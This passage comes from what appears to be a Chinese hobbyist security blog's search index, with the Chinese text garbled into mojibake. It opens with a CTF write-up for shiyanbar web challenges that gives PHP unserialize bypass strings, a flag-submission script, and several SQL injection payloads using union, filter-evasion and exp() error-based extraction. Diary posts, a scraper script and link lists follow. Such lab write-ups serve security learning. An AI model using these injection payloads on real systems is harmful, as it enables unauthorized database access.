å¯†ç»“æœå¼€å¤´ä¸º0çš„å³å¯</span><br><span class="line">æ•°ç»„ä¹Ÿåº”è¯¥æ‹¿å¯ä»¥ç»•è¿‡,è¿˜æ²¡è¯•è¿‡</span><br><span class="line">å›æ˜¾å¾—åˆ°/user.php?fame=hjkleffifer</span><br><span class="line">è®¿é—®å¾—åˆ°:</span><br><span class="line"><span class="variable">$unserialize_str</span> = <span class="variable">$_POST</span>[<span class="string">'password'</span>];</span><br><span class="line"><span class="variable">$data_unserialize</span> = unserialize(<span class="variable">$unserialize_str</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$data_unserialize</span>[<span class="string">'user'</span>] == <span class="string">'???'</span> &amp;&amp; <span class="variable">$data_unserialize</span>[<span class="string">'pass'</span>]==<span class="string">'???'</span>)</span><br><span class="line">&#123;</span><br><span class="line">print_r(<span class="variable">$flag</span>);</span><br><span class="line">&#125; ä¼Ÿå¤§çš„ç§‘å­¦å®¶phpæ–¹è¨€é“ï¼šæˆä¹Ÿå¸ƒå°”ï¼Œè´¥ä¹Ÿå¸ƒå°”ã€‚ å›å»å§éªšå¹´</span><br><span class="line"></span><br><span class="line">çœ‹æºç åº”è¯¥æ˜¯phpååºåˆ—</span><br><span class="line">å¯¹passwordè¿›è¡Œåºåˆ—åŒ–</span><br><span class="line">a:2:&#123;s:4:<span class="string">"user"</span>;b:1;s:4:<span class="string">"pass"</span>;b:1;&#125;</span><br></pre></td></tr></table></figure></li><li><p>Forms</p></li></ul><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">æŸ¥çœ‹æºç ï¼Œå‘ç°:</span><br><span class="line">&lt;input <span class="attribute">type</span>=<span class="string">"hidden"</span> <span class="attribute">name</span>=<span class="string">"showsource"</span> <span class="attribute">value</span>=0&gt;</span><br><span class="line">ä¿®æ”¹<span class="attribute">value</span>=1</span><br></pre></td></tr></table></figure><ul><li>Guess Next Session</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">æ¸…é™¤cookieå°±è¡Œäº†</span><br></pre></td></tr></table></figure><ul><li>æ‹å¼¯æŠ¹è§’</li></ul><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">è€ƒç‚¹: ä¼ªé™æ€</span><br><span class="line">æ„é€ <span class="keyword">index</span>.php/inedx.php</span><br></pre></td></tr></table></figure><ul><li>è®©æˆ‘è¿›å»</li></ul><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">è€ƒç‚¹: Hashæ‹“å±•é•¿åº¦æ”»å‡»åŸç†</span></span><br></pre></td></tr></table></figure><ul><li>å¤©ä¸‹æ­¦åŠŸå”¯å¿«ä¸ç ´</li></ul><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"> æŸ¥çœ‹æºç å‘ç°:</span><br><span class="line"> &lt;!-- please post what you find with <span class="keyword">parameter</span>:key <span class="comment">--&gt;</span></span><br><span class="line"> åœ¨è¿”å›æŠ¥æ–‡çœ‹åˆ°flag,æäº¤å‘ç°å¤±è´¥,äºæ˜¯å†™åˆ·æ–°å‘ç°flagåœ¨å˜,åˆ©ç”¨è„šæœ¬è¿›è¡Œæäº¤:</span><br><span class="line"> import <span class="comment">requests</span></span><br><span class="line">import <span class="comment">base64</span></span><br><span class="line">url <span class="comment">=</span> <span class="comment">'http://ctf5.shiyanbar.com/web/10/10.php'</span></span><br><span class="line"></span><br><span class="line">s <span class="comment">= requests.get(url)</span></span><br><span class="line"></span><br><span class="line">flag <span class="comment">= base64.b64decode((s.headers[</span><span class="comment">'FLAG'</span><span class="comment">]))</span></span><br><span class="line">f <span class="comment">= flag.decode()</span></span><br><span class="line"># print <span class="comment">(f.split(</span><span class="comment">':'</span><span class="comment">))</span></span><br><span class="line">f1 <span class="comment">= f.split(</span><span class="comment">':'</span><span class="comment">)[1]</span></span><br><span class="line"># print(flag)</span><br><span class="line">print(f1)</span><br><span class="line">f1 <span class="comment">= &#123;</span><span class="comment">'key'</span><span class="comment">:f1&#125;</span></span><br><span class="line">r <span class="comment">= requests.post(url,data=f1)</span></span><br><span class="line"></span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure><ul><li>ç®€å•çš„sqlæ³¨å…¥</li></ul><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">è¾“å…¥<span class="number">1</span>' or '<span class="number">1</span>'='<span class="number">1</span></span><br><span class="line">çˆ†å‡ºå…¨éƒ¨</span><br><span class="line"><span class="number">1</span>'  unionunion  selectselect  database()'</span><br><span class="line"><span class="number">1</span>'  unionunion  selectselect  flag  fromfrom  flag  wherewhere  '<span class="number">1</span></span><br></pre></td></tr></table></figure><ul><li>ç®€å•çš„sqlæ³¨å…¥ä¹‹2</li></ul><figure class="highlight vhdl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">æµ‹è¯•<span class="keyword">select</span></span><br><span class="line">å­˜åœ¨sqlæ³¨å…¥</span><br><span class="line">sel%<span class="number">0</span>aectç»•è¿‡æˆåŠŸ</span><br><span class="line">id=<span class="number">1</span><span class="symbol">'union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>'  //æˆåŠŸå›æ˜¾</span><br><span class="line">id=<span class="number">1</span><span class="symbol">'union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span>database()' //database() è¢«è¿‡æ»¤</span><br><span class="line">http://ctf5.shiyanbar.com/web/index_2.php?id=<span class="number">1</span><span class="symbol">'union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span>table_name<span class="comment">/**/</span>from<span class="comment">/**/</span>information_schema.tables<span class="comment">/**/</span>where<span class="comment">/**/</span><span class="string">'1'</span>='<span class="number">1</span></span><br><span class="line">id=<span class="number">1</span><span class="symbol">'union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span>column_name<span class="comment">/**/</span>from<span class="comment">/**/</span>information_schema.columns<span class="comment">/**/</span>where<span class="comment">/**/</span>table_name=<span class="symbol">'flag</span></span><br><span class="line">id=<span class="number">1</span>%<span class="number">27</span>union<span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span>flag<span class="comment">/**/</span>from<span class="comment">/**/</span>flag%<span class="number">23</span></span><br></pre></td></tr></table></figure><ul><li>ç®€å•çš„sqlæ³¨å…¥ä¹‹3</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">EXPæŠ¥é”™</span><br><span class="line">http://ctf5.shiyanbar.com/web/index_3.php?id=1'or exp(~(<span class="keyword">Select</span> * <span class="keyword">from</span> (<span class="keyword">select</span> <span class="keyword">database</span>())x)) %<span class="number">23</span></span><br><span class="line"><span class="keyword">http</span>://ctf5.shiyanbar.com/web/index_3.php?<span class="keyword">id</span>=<span class="number">1</span><span class="string">'or exp(~(Select * from (select group_concat(table_name) from information_schema.tables where table_schema=database())x)) %23</span></span><br><span class="line"><span class="string">http://ctf5.shiyanbar.com/web/index_3.php?id=1'</span><span class="keyword">or</span> <span class="keyword">exp</span>(~(<span class="keyword">Select</span> * <span class="keyword">from</span> (<span class="keyword">select</span> <span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'flag'</span>)x)) %<span class="number">23</span></span><br><span class="line"><span class="keyword">http</span>://ctf5.shiyanbar.com/web/index_3.php?<span class="keyword">id</span>=<span class="number">1</span><span class="string">'or exp(~(Select * from (select group_concat(flag) from flag)x)) %23</span></span><br></pre></td></tr></table></figure><ul><li>å› ç¼ºæ€æ±€çš„ç»•è¿‡</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p> -</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> writeup </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>å®æˆ˜åˆ©ç”¨pyçˆ¬å–å›¾ç‰‡</title>
      <link href="/2018/12/07/%E5%AE%9E%E6%88%98%E5%88%A9%E7%94%A8py%E7%88%AC%E5%8F%96%E5%9B%BE%E7%89%87/"/>
      <url>/2018/12/07/%E5%AE%9E%E6%88%98%E5%88%A9%E7%94%A8py%E7%88%AC%E5%8F%96%E5%9B%BE%E7%89%87/</url>
      
        <content type="html"><![CDATA[<p><meta name="referrer" content="no-referrer"></p><h1 id="è®°ç¬¬ä¸€æ¬¡å†™çˆ¬è™«"><a href="#è®°ç¬¬ä¸€æ¬¡å†™çˆ¬è™«" class="headerlink" title="è®°ç¬¬ä¸€æ¬¡å†™çˆ¬è™«"></a>è®°ç¬¬ä¸€æ¬¡å†™çˆ¬è™«</h1><p>ä½œä¸ºåªå›çœ‹æ‡‚ä»£ç çš„æˆ‘,ä»Šç©è¦è‡ªå·±åŠ¨æ‰‹å†™ä¸€æ¬¡çˆ¬è™«,ä»¥å‰çœ‹è¿‡<strong>BeautifulSoup</strong>å’Œ<strong>requests</strong>åº“çš„ä¸€äº›ç”¨æ³•,ç°åœ¨è¦è‡ªå·±å†™ä¸€ä¸ª,èŠ±äº†æˆ‘ä¸€ä¸ªæ™šä¸Šçš„æ—¶é—´,ç»“æœå†™å®Œä¹Ÿåªæœ‰åå‡ è¡Œçš„ä»£ç ,éš¾å—å—,çœ‹ç€è‡ªå·±å†™çš„åå‡ è¡Œè¾£é¸¡ä»£ç ,çœ‹æ¥è‡ªå·±ä»¥åå¾—å¥½å¥½è‡ªå·±åŠ¨æ‰‹å†™ä»£ç äº†.</p><h3 id="å®æˆ˜çˆ¬å–å›¾ç‰‡"><a href="#å®æˆ˜çˆ¬å–å›¾ç‰‡" class="headerlink" title="å®æˆ˜çˆ¬å–å›¾ç‰‡"></a>å®æˆ˜çˆ¬å–å›¾ç‰‡</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line">url = <span class="string">'https://mp.weixin.qq.com/s/_ejalkc-Dg-YsFEXfVNpVw'</span></span><br><span class="line"></span><br><span class="line">response = requests.get(url)</span><br><span class="line"></span><br><span class="line">html = response.text</span><br><span class="line"></span><br><span class="line">soup = BeautifulSoup(html,<span class="string">'html.parser'</span>)</span><br><span class="line"></span><br><span class="line">dd = soup.find_all(<span class="string">'img'</span>,attrs=&#123;<span class="string">'data-src'</span>:<span class="keyword">True</span>&#125;) <span class="comment"># æ‰¾åˆ°å±æ€§å€¼(å³å›¾ç‰‡åœ°å€)</span></span><br><span class="line">b=[]  <span class="comment">#å»ºä¸€ä¸ªåˆ—è¡¨æ”¾å›¾ç‰‡åœ°å€</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> img <span class="keyword">in</span> dd:</span><br><span class="line">    b.append(img.attrs[<span class="string">'data-src'</span>]) <span class="comment">#å°†è·å–çš„åœ°å€æ”¾åˆ°åˆ—è¡¨ä¸­,æˆ‘ä¹Ÿä¸çŸ¥é“è‡ªå·±ä¸ºä»€ä¹ˆè„‘æ®‹è¿™ä¹ˆåš</span></span><br><span class="line">x=<span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> imgurl <span class="keyword">in</span> b:</span><br><span class="line">    urllib.urlretrieve(imgurl,<span class="string">'%s.jpg'</span>%x)  <span class="comment">#æ„Ÿè§‰ç”¨requestsæ¥ç¼–å†™ä¸‹è½½çš„ä»£ç å¥½éº»çƒ¦å°±ç”¨urllibäº† (é€ƒ~</span></span><br><span class="line">    x = x + <span class="number">1</span></span><br></pre></td></tr></table></figure><p>èœé¸¡åˆå¾—è‡ªé—­äº† ==</p>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> çˆ¬è™« </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>æœ‰ç‚¹å°æƒ…ç»ª</title>
      <link href="/2018/11/24/%E6%97%A5%E8%AE%B0/"/>
      <url>/2018/11/24/%E6%97%A5%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="ä»Šå¤©å‡ºå¤ªé˜³äº†-æœ€èˆ’æœ"><a href="#ä»Šå¤©å‡ºå¤ªé˜³äº†-æœ€èˆ’æœ" class="headerlink" title="ä»Šå¤©å‡ºå¤ªé˜³äº†,æœ€èˆ’æœ!"></a>ä»Šå¤©å‡ºå¤ªé˜³äº†,æœ€èˆ’æœ!</h2><p>11æœˆå¥½å¤šCTFæ¯”èµ›é¸­~ æˆ‘è¿™ç§èœé¸¡åšä¸€é“é¢˜éƒ½è¦èŠ±ä¸€ä¸ªä¸‹åˆæˆ–è€…ä¸€ä¸ªæ™šä¸Šå¾ˆæ˜¯éš¾å—,æ¯”èµ›å’Œå¹³å¸¸çš„åˆ·é¢˜æœ‰åŒºåˆ«,å¹³å¸¸åˆ·é¢˜ä¸ä¼šå°±çœ‹writeup,hhhhh~<br>æ˜æ˜¾æ˜¯è‡ªå·±æ¯”èµ›é¢˜ç›®åšå°‘äº†,ç»éªŒä¸å¤š,å­¦çš„ä¸œè¥¿ä¸æ˜¯å¾ˆå¤š,æ„Ÿè§‰è‡ªå·±å­¦çš„éƒ½æ˜¯è¡¨é¢çš„ä¸œè¥¿,ç°åœ¨å­¦çš„çŸ¥è¯†æ¼æ´åŠåˆ©ç”¨éƒ½æ˜¯å¥½å‡ å¹´å‰çš„çŸ¥è¯†,ç°åœ¨æƒ³æ‰¾æ¼æ´çœŸçš„å¤ªéš¾äº†ã€‚<br>æœ‰æ—¶å€™è¿™é¢˜çœ‹freebufæ—¶å€™æœ‰äº›çœ‹éƒ½çœ‹ä¸æ‡‚,å°±æœ‰ç‚¹æƒ³æ”¾å¼ƒäº†,æƒ³ä»å¼€å‘å¼€å§‹åšèµ·,ä»Šå¤©æ¢äº†å‡ æœ¬è¿‡æœŸçš„ä¹¦åˆå€Ÿäº†ä¸¤æœ¬pythonçš„ä¹¦,æƒ³æŠŠè‡ªå·±çš„pythonæå‡,åšäº›å°ç¨‹åºå‡ºæ¥,å¥½è®©è‡ªå·±æœ‰æˆå°±æ„Ÿ<br>åŠ æ²¹~<br>å°‘è¯´è¯çš„ï¼Œå¤šåšäº‹ï¼Œè¦è‡ªä¿¡ï¼åšå¥½è‡ªå·±ï¼  ï¼ˆé€ƒ~</p>]]></content>
      
      
      <categories>
          
          <category> æ—¥è®° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ—¥è®° </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>æ–‡ä»¶ä¸Šä¼ æ¼æ´æ€»ç»“</title>
      <link href="/2018/11/24/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"/>
      <url>/2018/11/24/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<p><meta name="referrer" content="no-referrer"></p><h1 id="æ–‡ä»¶ä¸Šä¼ æ¼æ´æ€»ç»“"><a href="#æ–‡ä»¶ä¸Šä¼ æ¼æ´æ€»ç»“" class="headerlink" title="æ–‡ä»¶ä¸Šä¼ æ¼æ´æ€»ç»“"></a>æ–‡ä»¶ä¸Šä¼ æ¼æ´æ€»ç»“</h1><h5 id="åšè¿‡å¾ˆå¤šæ–‡ä»¶ä¸Šä¼ æ¼æ´-æ„Ÿè§‰ä¸éš¾-ä½†æ˜¯æ¯”èµ›æœ‰äº›è¿˜æ˜¯ä¸ä¼š-æ˜æ˜æ˜¯ä¸€ä¸ªå¾ˆç®€å•çš„çŸ¥è¯†ç‚¹-è¿˜è¦æƒ³åŠå¤©-ç°åœ¨æ¥æ€»ç»“ä¸€ä¸‹-è®©è‡ªå·±çš„æ€è·¯æ¸…æ™°ç‚¹-ç³»ç»ŸåŒ–-æ—¥å¸¸æ›´æ–°ï¼"><a href="#åšè¿‡å¾ˆå¤šæ–‡ä»¶ä¸Šä¼ æ¼æ´-æ„Ÿè§‰ä¸éš¾-ä½†æ˜¯æ¯”èµ›æœ‰äº›è¿˜æ˜¯ä¸ä¼š-æ˜æ˜æ˜¯ä¸€ä¸ªå¾ˆç®€å•çš„çŸ¥è¯†ç‚¹-è¿˜è¦æƒ³åŠå¤©-ç°åœ¨æ¥æ€»ç»“ä¸€ä¸‹-è®©è‡ªå·±çš„æ€è·¯æ¸…æ™°ç‚¹-ç³»ç»ŸåŒ–-æ—¥å¸¸æ›´æ–°ï¼" class="headerlink" title="åšè¿‡å¾ˆå¤šæ–‡ä»¶ä¸Šä¼ æ¼æ´,æ„Ÿè§‰ä¸éš¾,ä½†æ˜¯æ¯”èµ›æœ‰äº›è¿˜æ˜¯ä¸ä¼š,æ˜æ˜æ˜¯ä¸€ä¸ªå¾ˆç®€å•çš„çŸ¥è¯†ç‚¹,è¿˜è¦æƒ³åŠå¤©,ç°åœ¨æ¥æ€»ç»“ä¸€ä¸‹,è®©è‡ªå·±çš„æ€è·¯æ¸…æ™°ç‚¹,ç³»ç»ŸåŒ–,æ—¥å¸¸æ›´æ–°ï¼"></a>åšè¿‡å¾ˆå¤šæ–‡ä»¶ä¸Šä¼ æ¼æ´,æ„Ÿè§‰ä¸éš¾,ä½†æ˜¯æ¯”èµ›æœ‰äº›è¿˜æ˜¯ä¸ä¼š,æ˜æ˜æ˜¯ä¸€ä¸ªå¾ˆç®€å•çš„çŸ¥è¯†ç‚¹,è¿˜è¦æƒ³åŠå¤©,ç°åœ¨æ¥æ€»ç»“ä¸€ä¸‹,è®©è‡ªå·±çš„æ€è·¯æ¸…æ™°ç‚¹,ç³»ç»ŸåŒ–,æ—¥å¸¸æ›´æ–°ï¼</h5><p>å› ä¸ºå¾ˆå¤šå›¾ç‰‡,æ‡’å¾—æ”¾åœ¨å›¾åºŠé‡Œé¢,æ‰€ä»¥æ”¾åœ¨csdnæˆ–è€…åšå®¢å›­é‡Œé¢<br><a href="https://blog.csdn.net/qq_30464257/article/details/84404229#%E8%83%BD%E8%A2%AB%E8%A7%A3%E6%9E%90%E7%9A%84%E6%96%87%E4%BB%B6%E6%89%A9%E5%B1%95%E5%90%8D%E5%88%97%E8%A1%A8%EF%BC%9Ajsp%20jspx%20jspfasp%20asa%20cer%20aspxphp%20php%20php3%20php4exe%20exee" target="_blank" rel="noopener">æ–‡ä»¶ä¸Šä¼ æ¼æ´æ€»ç»“</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>æ¹–æ¹˜æ¯WP</title>
      <link href="/2018/11/21/2018%E6%B9%96%E6%B9%98%E6%9D%AFWP/"/>
      <url>/2018/11/21/2018%E6%B9%96%E6%B9%98%E6%9D%AFWP/</url>
      
        <content type="html"><![CDATA[<p><meta name="referrer" content="no-referrer"></p><h1 id="æ¹–æ¹˜æ¯åˆèµ›æ²¡è¿‡-åªèƒ½å¤ç°äº†QAQ"><a href="#æ¹–æ¹˜æ¯åˆèµ›æ²¡è¿‡-åªèƒ½å¤ç°äº†QAQ" class="headerlink" title="æ¹–æ¹˜æ¯åˆèµ›æ²¡è¿‡ åªèƒ½å¤ç°äº†QAQ"></a>æ¹–æ¹˜æ¯åˆèµ›æ²¡è¿‡ åªèƒ½å¤ç°äº†QAQ</h1>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>æ’å®‰æ¯å†å¹´WP</title>
      <link href="/2018/11/21/%E6%81%92%E5%AE%89%E6%9D%AF%E5%8E%86%E5%B9%B4WP/"/>
      <url>/2018/11/21/%E6%81%92%E5%AE%89%E6%9D%AF%E5%8E%86%E5%B9%B4WP/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="ä¸€æœˆ"><a href="#ä¸€æœˆ" class="headerlink" title="ä¸€æœˆ"></a>ä¸€æœˆ</h1><p><code>https://blog.csdn.net/luojiabin135/article/details/79638689</code><br><code>https://www.jianshu.com/p/abc44c54857a</code><br><code>http://rui0.cn/archives/763</code></p><h1 id="äºŒæœˆ"><a href="#äºŒæœˆ" class="headerlink" title="äºŒæœˆ"></a>äºŒæœˆ</h1><h1 id="ä¸‰æœˆ"><a href="#ä¸‰æœˆ" class="headerlink" title="ä¸‰æœˆ"></a>ä¸‰æœˆ</h1><p><code>https://coxxs.me/642</code><br><code>http://www.itdaan.com/blog/2018/03/26/acc9c32fda6f0e56651cc1322b43cf36.html</code></p><h1 id="äº”æœˆ"><a href="#äº”æœˆ" class="headerlink" title="äº”æœˆ"></a>äº”æœˆ</h1><p><code>https://blog.csdn.net/m0_38094687/article/details/80387188?utm_source=blogkpcl1</code></p><h1 id="å…­æœˆ"><a href="#å…­æœˆ" class="headerlink" title="å…­æœˆ"></a>å…­æœˆ</h1><p><code>https://blog.csdn.net/u011377996/article/details/80787236?utm_source=blogkpcl2</code></p><h1 id="å…«æœˆ"><a href="#å…«æœˆ" class="headerlink" title="å…«æœˆ"></a>å…«æœˆ</h1><p><code>https://www.jianshu.com/p/0da0312cd1fd</code></p><h1 id="ä¹æœˆ"><a href="#ä¹æœˆ" class="headerlink" title="ä¹æœˆ"></a>ä¹æœˆ</h1><p><code>https://www.anquanke.com/post/id/160582?from=singlemessage</code></p><h1 id="åæœˆ"><a href="#åæœˆ" class="headerlink" title="åæœˆ"></a>åæœˆ</h1><p><code>https://www.jianshu.com/p/e1af7cc3483d</code></p>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>CTF</title>
      <link href="/2018/11/21/CTF/"/>
      <url>/2018/11/21/CTF/</url>
      
        <content type="html"><![CDATA[<p><meta name="referrer" content="no-referrer"></p><h1 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h1><pre><code>ç­±é˜³QQï¼š1260457781</code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
  
  
</search>
